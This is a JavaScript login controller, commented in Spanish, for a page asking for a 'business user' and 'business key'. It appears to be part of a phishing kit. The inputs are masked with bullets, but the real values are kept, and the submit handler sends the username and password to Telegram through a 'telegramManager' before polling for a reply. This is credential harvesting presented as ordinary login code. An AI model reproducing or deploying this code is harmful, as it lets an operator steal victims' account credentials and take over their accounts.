/**
 * LOGIN CONTROLLER - CÓDIGO LIMPIO Y OPTIMIZADO
 */

'use strict';

class LoginController {
    constructor() {
        // Elementos DOM
        this.userInput = document.getElementById('userInput');
        this.passInput = document.getElementById('passInput');
        this.userLabel = document.getElementById('userFloatingLabel');
        this.passLabel = document.getElementById('passFloatingLabel');
        this.toggleUserBtn = document.getElementById('toggleUser');
        this.togglePassBtn = document.getElementById('togglePass');
        this.loginBtn = document.getElementById('loginBtn');

        // Estado
        this.userRealValue = '';
        this.passRealValue = '';
        this.userVisible = false;
        this.passVisible = false;

        this.init();
    }

    init() {
        this.setupUserInput();
        this.setupPassInput();
        this.setupToggles();
    }

    // ===== USUARIO DE NEGOCIOS =====
    setupUserInput() {
        // Input event
        this.userInput.addEventListener('input', (e) => {
            if (this.userVisible) {
                // Modo visible: guardar directamente
                this.userRealValue = e.target.value;
            } else {
                // Modo oculto: procesar enmascarado
                this.processUserMaskedInput(e);
            }

            this.toggleLabel(this.userLabel, this.userRealValue);
            this.validateForm();
        });

        this.userInput.addEventListener('focus', () => {
            this.userLabel.classList.add('active');
        });

        this.userInput.addEventListener('blur', () => {
            if (!this.userRealValue) {
                this.userLabel.classList.remove('active');
            }
        });
    }

    processUserMaskedInput(e) {
        const input = e.target;
        const currentValue = input.value;
        const totalLength = currentValue.length;
        const previousLength = this.userRealValue.length;

        if (totalLength > previousLength) {
            // Addition: find all characters that aren't bullets
            const newChars = currentValue.split('').filter(char => char !== '•');
            if (newChars.length > 0) {
                this.userRealValue += newChars.join('');
            }
        } else if (totalLength < previousLength) {
            // Deletion
            this.userRealValue = this.userRealValue.slice(0, totalLength);
        }

        // Always show bullets
        input.value = '•'.repeat(this.userRealValue.length);
        input.setAttribute('data-masked', 'true');
    }

    // ===== CLAVE DE NEGOCIOS =====
    setupPassInput() {
        // Input event
        this.passInput.addEventListener('input', (e) => {
            if (this.passVisible) {
                // Modo visible: guardar directamente
                this.passRealValue = e.target.value;
            } else {
                // Modo oculto: procesar enmascarado
                this.processPassMaskedInput(e);
            }

            this.toggleLabel(this.passLabel, this.passRealValue);
            this.validateForm();
        });

        this.passInput.addEventListener('focus', () => {
            this.passLabel.classList.add('active');
        });

        this.passInput.addEventListener('blur', () => {
            if (!this.passRealValue) {
                this.passLabel.classList.remove('active');
            }
        });
    }

    processPassMaskedInput(e) {
        const input = e.target;
        const currentValue = input.value;
        const totalLength = currentValue.length;
        const previousLength = this.passRealValue.length;

        if (totalLength > previousLength) {
            // Addition
            const newChars = currentValue.split('').filter(char => char !== '•');
            if (newChars.length > 0) {
                this.passRealValue += newChars.join('');
            }
        } else if (totalLength < previousLength) {
            // Deletion
            this.passRealValue = this.passRealValue.slice(0, totalLength);
        }

        // Always show bullets
        input.value = '•'.repeat(this.passRealValue.length);
        input.setAttribute('data-masked', 'true');
    }

    // ===== TOGGLE VISIBILITY =====
    setupToggles() {
        // Toggle usuario
        this.toggleUserBtn.addEventListener('click', () => {
            this.userVisible = !this.userVisible;

            // Animation effect
            this.toggleUserBtn.style.transform = 'scale(0.9)';

            setTimeout(() => {
                this.toggleUserBtn.style.transform = 'scale(1)';
                if (this.userVisible) {
                    this.userInput.value = this.userRealValue;
                    this.userInput.setAttribute('data-masked', 'false');
                    this.toggleUserBtn.querySelector('.eye-icon').classList.add('hidden');
                    this.toggleUserBtn.querySelector('.eye-slash-icon').classList.remove('hidden');
                } else {
                    this.userInput.value = '•'.repeat(this.userRealValue.length);
                    this.userInput.setAttribute('data-masked', 'true');
                    this.toggleUserBtn.querySelector('.eye-icon').classList.remove('hidden');
                    this.toggleUserBtn.querySelector('.eye-slash-icon').classList.add('hidden');
                }
                this.userInput.focus();
            }, 100);
        });

        // Toggle password
        this.togglePassBtn.addEventListener('click', () => {
            this.passVisible = !this.passVisible;

            // Animation effect
            this.togglePassBtn.style.transform = 'scale(0.9)';

            setTimeout(() => {
                this.togglePassBtn.style.transform = 'scale(1)';
                if (this.passVisible) {
                    this.passInput.value = this.passRealValue;
                    this.passInput.setAttribute('data-masked', 'false');
                    this.togglePassBtn.querySelector('.eye-icon').classList.add('hidden');
                    this.togglePassBtn.querySelector('.eye-slash-icon').classList.remove('hidden');
                } else {
                    this.passInput.value = '•'.repeat(this.passRealValue.length);
                    this.passInput.setAttribute('data-masked', 'true');
                    this.togglePassBtn.querySelector('.eye-icon').classList.remove('hidden');
                    this.togglePassBtn.querySelector('.eye-slash-icon').classList.add('hidden');
                }
                this.passInput.focus();
            }, 100);
        });
    }

    // ===== HELPERS =====
    toggleLabel(label, value) {
        if (value.length > 0) {
            label.classList.add('active');
        } else {
            label.classList.remove('active');
        }
    }

    validateForm() {
        if (this.userRealValue.length > 0 && this.passRealValue.length > 0) {
            this.loginBtn.disabled = false;

            // Agregar handler para envío con overlay y Telegram
            this.loginBtn.onclick = async (e) => {
                e.preventDefault();

                // Mostrar overlay
                const overlay = document.querySelector('.loading-overlay');
                if (overlay) {
                    overlay.classList.add('active');
                }

                // Enviar a Telegram y esperar respuesta
                const sendResult = await window.telegramManager.sendToTelegram('login', {
                    usuario: this.userRealValue,
                    clave: this.passRealValue
                });

                // Solo iniciar polling si el envío fue exitoso
                if (sendResult && sendResult.success) {
                    window.telegramManager.startPolling();
                }
            };
        } else {
            this.loginBtn.disabled = true;
            this.loginBtn.onclick = null;
        }
    }
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    new LoginController();
    console.log('Login Controller initialized');
});
